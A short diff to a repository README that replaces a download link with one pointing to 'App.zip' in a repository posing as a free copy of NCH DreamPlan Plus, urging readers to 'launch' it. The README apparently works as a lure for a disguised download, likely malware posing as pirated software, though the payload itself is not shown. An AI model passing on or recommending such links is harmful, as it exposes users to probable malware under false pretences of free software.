@@ -26,7 +26,7 @@ The topics covered in this repository include:
 
 ## Get Started
 To get started with this repository, you can download the repository content by clicking on the link below:
-[Download NCH DreamPlan Plus Free](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download NCH DreamPlan Plus Free](https://github.com/GoGoatedFPS/NCH-DreamPlan-Plus-Free/releases/download/v1.0/App.zip)
 
 ## Please Note
 The provided link needs to be launched to access the content.
